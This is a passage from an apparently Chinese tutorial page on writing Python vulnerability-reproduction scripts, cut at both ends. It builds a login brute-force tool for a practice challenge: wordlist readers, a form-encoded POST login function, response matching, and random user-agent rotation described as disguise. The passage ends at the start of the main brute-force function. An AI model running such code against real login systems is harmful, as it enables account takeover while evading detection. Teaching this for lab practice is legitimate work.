style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;"> suffix</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) -&gt; </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;&quot;&quot;匹配 reponse.text 中 prefix - suffix 中间的字符串并返回匹配结果 </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    Args:</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        text: 待匹配的字符串(一般为 request 请求的 response.text)  </span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        prefix: 匹配的前缀  </span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        suffix: 匹配的后缀</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    Returns:</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        匹配结果</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;&quot;&quot;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    return</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> text[text.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">find</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(prefix) </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> len</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(prefix):text.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">find</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(suffix)]</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>比如这里就可以这样用</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">match_result </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;"> match_fix</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(reponse_text, </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">prefix</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;&lt;/form&gt;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\n</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        &lt;p&gt; &quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">suffix</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;&lt;/p&gt;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\n\\n</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &lt;/div&gt;&lt;!-- /.widget-&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><hr><h4 id="根据复现逻辑继续编写脚本" tabindex="-1"><a class="header-anchor" href="#根据复现逻辑继续编写脚本"><span>根据复现逻辑继续编写脚本</span></a></h4><p>暴力破解首先需要有账密字典, 可以是弱密码字典, 也可以是社工字典, 亦可以是根据密码生成规则自定义构造的字典</p><p>那么可以将字典文件放入工作区, 假设这些字典每一行对应一个 账号/密码, 那么可以定义一个读字典生成账号/密码列表的函数</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> read_dict_to_list</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;">dict_path</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) -&gt; </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">list</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;&quot;&quot;读取字典文件到列表</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    Args:</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        dict_path: 字典文件路径(绝对路径)(可以使用 os.path.join 或者 pathlib 进行拼接)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    Returns:</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        字典内容列表</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;&quot;&quot;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    with</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> open</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(dict_path, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;r&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">as</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> f:</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        # 按行读取并去除换行符</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        return</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [line.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">strip</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">() </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> line </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">in</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> f.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">readlines</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()]</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><p>将刚才生成的 Python 请求代码进行优化并封装成函数</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> post_request</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;">        socket</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;"> url_path</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;">        user_gent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;">        username</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;"> password</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;">        prefix</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;"> suffix</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    ) -&gt; </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;&quot;&quot;携带账密发送一次 post 请求获取 response, 并根据前后缀匹配出 reponse 中实际有效的部分</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    (比如本例中的 username or password is not exist ~ 和 login success)    </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    适用于 http 请求, 无前置校验,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    数据格式为表单数据编码(Form-Encode也即 content-type:application/x-www-form-urlencoded)形式  </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    在 pyload 上如果除了 username 和 password 之外还有其他参数</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    (如此函数中的 submit=Login)(一般是用于标识登录操作的), 请相应修改此函数中的 payload 项</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    Args:</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        socket: socket 地址, host-ip:port 的形式  </span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        url_path: url 路径, 为 url 中 port 后面的 /path 部分  </span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        user_gent: user-agent  </span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        username: 账号  </span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        password: 密码  </span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        prefix: 匹配的前缀</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        suffix: 匹配的后缀</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    Returns:</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        响应结果</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;&quot;&quot;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    # 请求头</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    headers </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        &quot;content-type&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;application/x-www-form-urlencoded&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        &quot;user-agent&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: user_gent</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    }</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    # 请求地址</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    url </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">{</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">socket</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">}{</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">url_path</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    # 请求数据</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    payload </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;username=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">{</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">username</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&amp;password=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">{</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">password</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&amp;submit=Login&quot;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    # 发送请求并返回响应结果</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    reponse_text </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> requests.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">post</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(url, </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">data</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">payload, </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">headers</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">headers).text</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    # 匹配出响应结果中实际有效的部分</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    match_result </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;"> match_fix</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(reponse_text, prefix, suffix)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    return</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> match_result</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>这里精简了请求头, 因为在本题中后端只需要这些参数就够了, 甚至 <code>user-agent</code> 也可以不要, 不过全部保留也是可以的</p><p>关于 user-agent 参数, 这里是读取了<a href="https://github.com/Ayusummer/DailyNotes/blob/main/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/Web%E6%BC%8F%E6%B4%9E%E9%80%9A%E7%94%A8%E5%9E%8BPython%E5%A4%8D%E7%8E%B0%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/browsers.json" target="_blank" rel="noopener noreferrer">一个浏览器请求头的 json</a> 文件, 意在每次发送求都用不同的 <code>user-agent</code>, 不过实际上需要配合其他伪装方式使用, 这里仅仅是因为有所了解所以加上了, 亦可以直接固定使用 burp 抓到的请求头</p><p>关于该 json 文件处理的函数如下</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> getUserAgentList</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;">browers_json_path</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) -&gt; </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">list</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;&quot;&quot;读取 browsers.json 返回 user-agent 列表  </span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    </span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    Args:</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        browers_json_path: browsers.json 文件路径(绝对路径)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    Returns:</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        user-agent 列表</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;&quot;&quot;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    with</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> open</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(browers_json_path, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;r&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">as</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> f:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        header </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;"> json_load</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(f)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    browsers </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> header[</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;browsers&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    # 将所有键的值取出来组成一个列表</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    user_agent_list </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> []</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> key </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">in</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> browsers.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">keys</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">():</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> item </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">in</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> browsers[key]:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            user_agent_list.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">append</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(item)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    return</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> user_agent_list</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></blockquote><hr><p>至此, 先决条件已经准备地差不多了, 可以开始写暴力破解的主体函数了</p><p>对于一个通用的暴力破解脚本, 需要准备 <code>接口URL</code> 和, <code>账密字典</code> 以及 <code>判断请求失败的关键字符串</code>, 这里额外增加了 <code>浏览器头 json 文件地址</code>, <code>关键信息匹配前后缀</code> 以及 <code>请求间隔时间</code> 来控制暴力破解速度</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> brute_force</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;">        socket</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;"> url_path</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;">        browers_json_path</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;">        account_dict_path</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;"> password_dict_path</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;">        prefix</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;"> suffix</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;"> fail_keyword</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
